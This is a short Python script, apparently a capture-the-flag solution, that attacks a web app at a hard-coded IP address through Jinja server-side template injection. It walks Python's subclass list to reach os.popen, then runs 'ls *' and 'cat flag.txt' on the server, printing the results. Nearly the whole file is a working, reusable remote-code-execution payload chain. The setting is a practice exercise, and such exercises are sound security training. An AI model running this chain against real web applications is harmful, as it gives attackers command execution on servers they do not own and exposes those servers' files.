# SSTI Jinja Injection
import requests,html

# List all classes to map attack
host = "http://134.209.186.158:32568/?name="
payload = """{%"".__class__.__mro__[1].__subclasses__()%}"""
r = requests.get(host+payload)

print(html.unescape(r.text))

# Found <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>
# at [185] and [186], use either

payload = """{%"".__class__.__mro__[1].__subclasses__()[186].__init__.\
    __globals__.__builtins__.__import__('os').popen("ls *").read()%}"""
r = requests.get(host+payload)

print(html.unescape(r.text))

# Found flag.txt, nyoice
payload = """{%"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__.__builtins__.__import__('os').popen("cat flag.txt").read()%}"""
r = requests.get(host+payload)

print(html.unescape(r.text))
